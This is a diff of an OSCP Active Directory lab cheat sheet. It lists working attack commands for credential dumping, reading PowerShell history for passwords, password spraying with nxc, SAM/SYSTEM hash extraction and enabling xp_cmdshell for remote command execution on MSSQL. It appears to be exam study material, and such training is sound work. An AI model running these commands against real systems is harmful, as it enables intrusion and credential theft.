@@ -1,11 +1,11 @@
 # 🛡️ OSCP Active Directory Lab Guide
 
 ## 1. Escalate on MS01 (Always Dual-Homed)
-- Check privileges:
+- Check privileges; if `SeImpersonatePrivilege` is there, use one of [these](https://x7331.gitbook.io/boxes/tl-dr/active-directory/privileges/seimpersonateprivilege) to escalate to Local Admin 
 ```powershell
 whoami /priv
 ```
-- If `SeImpersonatePrivilege` is there, use one of [these](https://x7331.gitbook.io/boxes/tl-dr/active-directory/privileges/seimpersonateprivilege) to escalate to Local Admin
+- Look for custom binaries → download and run `strings` to extract creds, check for [binary](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#service-binary-hijacking)/[DLL](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#dll-hijacking) hijacking
 ## 2. Pillaging
 - Dump credentials with Mimikatz:
 ```powershell
@@ -16,8 +16,13 @@ whoami /priv
 - Check PowerShell history:
 ```powershell
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# Enumerate the path
+(Get-PSReadlineOption).HistorySavePath
+# List its contents
+cat C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
-## 3. Enumerate the Domain (From MS01)
 - Enumerate domain users and build a wordlist
 ```bash
 $ nxc smb 192.168.X.X -u <user> -p <pass> --users | awk '$1 == "SMB" && $5 != "[+]" && $5 != "-Username-" && $5 != "[*]" {print $5}' > domain_users
@@ -42,19 +47,23 @@ nxc smb domain_ips -u domain_users -p passwords --continue-on-success | grep +
 nxc winrm domain_ips -u domain_users -p passwords --continue-on-success | grep +
 nxc rdp domain_ips -u domain_users -p passwords --continue-on-success | grep +
 ```
-## 3. Pivot to MS02
-- Use sprayed creds to access via WinRM or RDP:
+## 2. Pivot to MS02
+- Use sprayed creds to check access via WinRM or RDP:
 ```bash
 evil-winrm -u <user> -p <pass> -i <MS02>
 xfreerdp /u:<user> /p:<pass> /v:<MS02> /smart-sizing
 ```
-## 4. Enumerate MS02
+## 3. Enumerate MS02
 - Check for `C:\windows.old` folder → [dump SAM and SYSTEM locally](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/local-sam-dump):
 ```bash
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 ```
-- Look for custom binaries → download and run `strings` to extract creds, check for [binary](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#service-binary-hijacking/[DLL](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#dll-hijacking) hijacking
-- Read [PowerShell history](https://x7331.gitbook.io/boxes/tl-dr/infra/windows#files):
+- Look for custom binaries → download and run `strings` to extract creds, check for [binary](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#service-binary-hijacking)/[DLL](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#dll-hijacking) hijacking
+- Check local sockets:
+```powershell
+netstat -ano
+```
+- Check [PowerShell history](https://x7331.gitbook.io/boxes/tl-dr/infra/windows#files):
 ```powershell
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -64,13 +73,18 @@ Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadL
 # List its contents
 cat C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
-## 5. Domain Privilege Escalation
-- Crack Kerberoast/AS-REP hashes (e.g. with hashcat or john)
-- Use cracked SQL creds to connect with mssqlclient.py:
+- if `sql_svc` is owned, interact via Impacket or NetExec:
 ```bash
+# Impacket
 mssqlclient.py <domain>/<user>@<host> -windows-auth
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
+
+# NXC
+# Remote queries
+nxc mssql <target> -u <user> -p <pass> --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
+# System RCE via xp_cmdshell
+nxc mssql <target> -u <user> -p <pass> --local-auth -x whoami
 ```
-- Spray all discovered creds again to escalate further
+- Pass-spray all discovered creds
